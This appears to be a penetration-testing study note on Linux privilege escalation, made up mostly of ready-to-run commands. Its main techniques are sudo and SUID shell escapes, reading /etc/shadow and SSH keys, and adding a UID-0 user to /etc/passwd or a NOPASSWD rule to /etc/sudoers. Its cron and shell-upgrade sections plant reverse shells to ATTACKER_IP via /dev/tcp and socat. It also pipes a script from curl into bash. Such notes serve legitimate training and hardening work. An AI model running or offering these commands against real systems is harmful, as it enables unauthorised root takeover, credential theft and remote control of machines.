---
title: Linux Privilege Escalation
tags:
  - fundamentals
  - linux
  - privilege-escalation
  - post-exploitation
  - intermediate
topic: Post-Exploitation
difficulty: advanced
created: 2026-03-23
updated: 2026-04-04
source: GTFOBins, HackTricks Linux privilege escalation, LinPEAS
---

# Linux Privilege Escalation

## Overview
Privilege escalation (privesc) is the act of gaining a higher level of access than initially granted — typically from a low-privilege shell to root. On Linux systems, there are consistent, reliable techniques that appear repeatedly in CTFs, lab environments, and real-world penetration tests.

## Why It Matters in Security
Getting a shell is rarely the end goal — getting root is. Understanding privesc techniques is essential for penetration testers and defenders alike. Defenders must audit for exactly these misconfigurations to harden systems.

---

## Initial Enumeration Checklist

Run these immediately after landing a shell:

```bash
# Who are you?
id
whoami
groups

# System info
uname -a
cat /etc/os-release
hostname

# Network — what else is reachable?
ip addr
ip route
ss -tulnp
cat /etc/hosts

# What can you sudo?
sudo -l

# Environment variables
env
echo $PATH

# Other users on the system
cat /etc/passwd
cat /etc/shadow     # If readable — critical find
ls -la /home/

# Currently running processes
ps aux
ps aux | grep root

# Scheduled tasks
crontab -l
cat /etc/cron*
ls -la /etc/cron.d/
ls -la /var/spool/cron/

# Writable files and directories
find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys
find / -writable -type d 2>/dev/null | grep -v /proc | grep -v /sys

# SUID/SGID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# World-writable files
find / -perm -o+w -type f 2>/dev/null | grep -v /proc

# Capabilities
getcap -r / 2>/dev/null

# Installed software / versions
dpkg -l
rpm -qa
ls /var/log/

# History files
cat ~/.bash_history
cat ~/.zsh_history
find / -name "*.history" 2>/dev/null

# Config files that might contain credentials
find / -name "*.conf" 2>/dev/null | head -30
find / -name "*.config" 2>/dev/null | head -20
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
```

---

## Technique 1 — Sudo Misconfigurations

### Check what you can run
```bash
sudo -l
```

### No password required for everything
```
(ALL) NOPASSWD: ALL
```
→ `sudo bash` → instant root

### Sudo on specific binary — GTFOBins
Visit https://gtfobins.github.io/ and search for the allowed binary.

**Common sudo escapes:**
```bash
# vim / vi
sudo vim -c ':!/bin/bash'

# nano
sudo nano
# In nano: Ctrl+R → Ctrl+X → reset; execute bash

# less
sudo less /etc/passwd
# Inside less: !bash

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# python / python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# nmap (old versions)
sudo nmap --interactive
# Inside nmap: !sh

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# zip
sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"

# curl (read sensitive files)
sudo curl file:///etc/shadow

# tee (write to protected files)
echo "root2::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
```

---

## Technique 2 — SUID Binaries

SUID binaries run as the file owner (often root), regardless of who executes them.

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Common SUID exploits (GTFOBins):**
```bash
# bash (if SUID is set)
bash -p      # -p preserves EUID; gives root shell

# find
find . -exec /bin/bash -p \; -quit

# vim
./vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'

# cp (overwrite /etc/passwd)
cp /etc/passwd /tmp/passwd.bak
# Generate password hash: openssl passwd -1 "newpass"
echo "hacker:HASH:0:0:root:/root:/bin/bash" >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
su hacker

# nmap (old versions with --interactive)
nmap --interactive
!sh
```

---

## Technique 3 — Cron Job Abuse

If root runs a cron job that executes a script you can write to:

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l

# Find writable scripts called by cron
# Example: cron runs /opt/backup.sh as root
ls -la /opt/backup.sh   # If writable...
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh
# Wait for cron execution → catch root shell on attacker
```

**PATH hijacking via cron:**
If a cron job uses a relative command (no full path), and you control an earlier directory in `PATH`:
```bash
# Cron: * * * * * root backup_script
# /usr/local/bin is in PATH before /usr/bin
echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /usr/local/bin/backup_script
chmod +x /usr/local/bin/backup_script
```

---

## Technique 4 — Writable /etc/passwd

If `/etc/passwd` is world-writable, you can add a root-level user:

```bash
# Check
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 "hacked123"
# or
python3 -c "import crypt; print(crypt.crypt('hacked123', crypt.mksalt(crypt.METHOD_SHA512)))"

# Add user with UID 0
echo "hacker:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd

# Switch to new user
su hacker
id   # uid=0(root)
```

---

## Technique 5 — Weak File Permissions on Sensitive Files

```bash
# /etc/shadow readable?
cat /etc/shadow
# If yes → copy hashes → crack with Hashcat or John

# /etc/sudoers writable?
echo "yourusername ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
sudo bash

# SSH private keys?
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
cat /root/.ssh/id_rsa     # If readable
```

---

## Technique 6 — Linux Capabilities

Capabilities grant specific root privileges to a binary without full SUID.

```bash
getcap -r / 2>/dev/null
```

**Dangerous capabilities:**
| Capability | Exploit |
|---|---|
| `cap_setuid+ep` | Set UID to 0 → root |
| `cap_net_raw+ep` | Raw socket access; sniff traffic |
| `cap_dac_override+ep` | Bypass file permission checks |

**Python with cap_setuid:**
```bash
# If python3 has cap_setuid+ep:
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

**Perl with cap_setuid:**
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

---

## Technique 7 — NFS No Root Squash

If an NFS share has `no_root_squash`, a remote root user can write SUID files to the share.

```bash
# On target: check NFS exports
cat /etc/exports

# If no_root_squash is present for a share:
# On attacker (as root):
showmount -e TARGET_IP
mount -t nfs TARGET_IP:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target:
/share/bash -p    # root shell
```

---

## Technique 8 — Kernel Exploits

Check kernel version, search for known exploits. Use as a last resort — can crash systems.

```bash
uname -a
# Example: Linux 4.4.0-116-generic
searchsploit linux kernel 4.4.0 local privilege escalation
```

**Famous kernel exploits:**
| Name | CVE | Affected |
|---|---|---|
| Dirty COW | CVE-2016-5195 | Linux kernel < 4.8.3 |
| Dirty Pipe | CVE-2022-0847 | Linux kernel 5.8 – 5.16.11 |
| PwnKit | CVE-2021-4034 | polkit pkexec (most distros) |
| OverlayFS | CVE-2023-0386 | Linux kernel < 6.2 |

---

## Automated Enumeration Tools

```bash
# LinPEAS — most comprehensive
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
# Or transfer and run:
chmod +x linpeas.sh && ./linpeas.sh 2>/dev/null | tee linpeas_output.txt

# LinEnum
chmod +x LinEnum.sh && ./LinEnum.sh

# Linux Smart Enumeration (LSE)
chmod +x lse.sh && ./lse.sh -l1

# pspy — monitor processes without root (catch cron jobs in real-time)
chmod +x pspy64 && ./pspy64
```

---

## Shell Upgrade (Essential After Initial Access)

```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then:
Ctrl+Z
stty raw -echo
fg
# Press Enter twice
export TERM=xterm
stty rows 40 columns 160

# Script command
script /dev/null -c bash

# socat (if available)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

---

## Key Terms
| Term | Definition |
|---|---|
| SUID | Set User ID — binary runs with owner's privileges when executed |
| SGID | Set Group ID — binary runs with owning group's privileges |
| Capabilities | Fine-grained privileges that can be assigned to binaries without full SUID |
| Cron | Linux task scheduler — runs commands at specified times |
| NFS | Network File System — Linux file sharing protocol |
| GTFOBins | Reference of Unix binaries that can be abused for privesc |
| Sticky Bit | Prevents users from deleting files in a directory they don't own (e.g., /tmp) |

## Related Notes
- Linux-Commands
- Metasploit
- Active-Directory

## Sources

GTFOBins. (n.d.). *GTFOBins: Unix binaries for privilege escalation*. https://gtfobins.github.io/

Carlos Polop. (2024). *Linux privilege escalation*. HackTricks. https://book.hacktricks.xyz/linux-hardening/privilege-escalation

PEASS-ng Team. (2024). *LinPEAS: Linux privilege escalation awesome script*. GitHub. https://github.com/peass-ng/PEASS-ng

## See Also

- Penetration-Testing-Methodology
- Metasploit
- Netcat
- Bash-Scripting
- Linux-Commands
- Windows-Privilege-Escalation

---
<- [[Fundamentals-MOC]]